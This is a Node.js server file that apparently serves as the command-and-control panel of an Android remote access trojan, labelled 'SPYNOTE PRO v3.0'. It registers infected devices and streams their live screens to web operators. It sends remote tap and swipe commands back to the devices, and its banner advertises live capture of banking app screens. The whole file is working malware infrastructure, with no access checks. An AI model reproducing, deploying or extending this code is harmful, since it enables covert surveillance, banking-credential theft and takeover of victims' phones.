const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 30000,
    pingInterval: 5000, // Faster heartbeat
    maxHttpBufferSize: 100e6 // 100MB HD frames
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

// 🔥 GLOBAL BROADCAST ROOM for ALL web clients
const webClients = new Set();

io.on('connection', (socket) => {
    console.log('🔌 Socket connected:', socket.id);

    // 🔥 WEB CLIENT joins global broadcast room
    socket.on('web-client-join', () => {
        webClients.add(socket.id);
        socket.join('web-broadcast');
        console.log('🌐 Web client joined broadcast:', socket.id);
    });

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(`device_${deviceId}`);
            socket.join('all-devices'); // 🔥 ALL devices room
            console.log('✅ DEVICE LIVE:', deviceId.slice(0,12), deviceInfo.model);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    socket.on('select-device', (data) => {
        console.log('🎯 Web selected:', data.deviceId);
        socket.data.selectedDevice = data.deviceId;
    });

    // 🔥 FRAME RELAY - TO ALL WEB CLIENTS + SELECTED DEVICE ROOM
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        if (devices.has(deviceId)) {
            const device = devices.get(deviceId);
            devices.set(deviceId, { ...device, lastSeen: Date.now() });
            
            console.log(`📱 Frame #${++frameData.frameId || 0} → ${deviceId.slice(0,8)} (${frameData.width}x${frameData.height})`);
            
            // 🔥 BROADCAST TO ALL WEB CLIENTS (INSTANT!)
            socket.to('web-broadcast').emit('screen-frame', frameData);
            // Also to device-specific room
            socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
            // To all devices room
            socket.to('all-devices').emit('screen-frame', frameData);
        }
    });

    // 🔥 CONTROL ROUTING - PERFECT!
    socket.on('control', (controlData) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
        if (devices.has(deviceId)) {
            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${Math.round(x)},${Math.round(y)})`);
            socket.to(`device_${deviceId}`).emit('control', controlData);
        }
    });

    socket.on('disconnect', () => {
        webClients.delete(socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device OFFLINE:', deviceId);
                break;
            }
        }
    });
});

// Heartbeat
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected && (now - info.lastSeen > 45000)) {
            devices.set(deviceId, { ...info, connected: false });
            io.emit('devices-update', Array.from(devices.entries()));
        }
    }
}, 15000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 SPYNOTE PRO v3.0 - ULTRA SMOOTH`);
    console.log(`🌐 Web: http://localhost:${PORT}`);
    console.log(`📱 Instant frames + banking app LAYOUTS LIVE!\n`);
});
